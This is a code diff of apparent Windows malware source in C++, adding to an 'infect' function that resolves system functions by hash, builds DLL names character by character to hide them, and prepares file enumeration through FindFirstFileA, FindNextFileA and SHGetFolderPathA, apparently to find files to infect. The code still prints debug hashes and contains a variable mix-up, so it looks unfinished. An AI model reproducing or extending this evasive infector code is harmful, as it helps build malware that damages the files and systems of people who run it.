@@ -90,6 +90,15 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
 }
 
 typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
+typedef void * (* mallocHeader)(std::size_t);
+typedef void * (* reallocHeader)(void *, std::size_t);
+typedef void (* freeHeader)(void *);
+typedef char * (* strncatHeader)(char *, const char *, std::size_t);
+typedef std::size_t (* strlenHeader)(const char *);
+typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
+typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
+typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
+typedef SHFOLDERAPI (* SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
 
 void infect(void)
 {
@@ -126,9 +135,16 @@ void infect(void)
       return;
 
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
+   FindFirstFileAHeader findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
+   FindNextFileAHeader findNextFile = reinterpret_cast<FindNextFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x6f4d1398));
    char msvcrtDll[] = {'m','s','v','c','r','t','.','d','l','l',0};
-   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(msvcrtDll));
+   mallocHeader malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
+   reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
+   freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
+   strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrt, 0xb1ee6f2e));
+   
+   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
 
    std::wcout << "msvcrt: " << std::hex << (std::uintptr_t)msvcrtModule << std::endl;
@@ -138,6 +154,7 @@ void infect(void)
    std::wcout << "free: " << std::hex << fnv321a("free") << std::endl;
    std::wcout << "strncat: " << std::hex << fnv321a("strncat") << std::endl;
    std::wcout << "strlen: " << std::hex << fnv321a("strlen") << std::endl;
+   std::wcout << "memcpy: " << std::hex << fnv321a("memcpy") << std::endl;
    std::wcout << "FindFirstFileA: " << std::hex << fnv321a("FindFirstFileA") << std::endl;
    std::wcout << "FindNextFileA: " << std::hex << fnv321a("FindNextFileA") << std::endl;
    std::wcout << "SHGetFolderPathA: " << std::hex << fnv321a("SHGetFolderPathA") << std::endl;
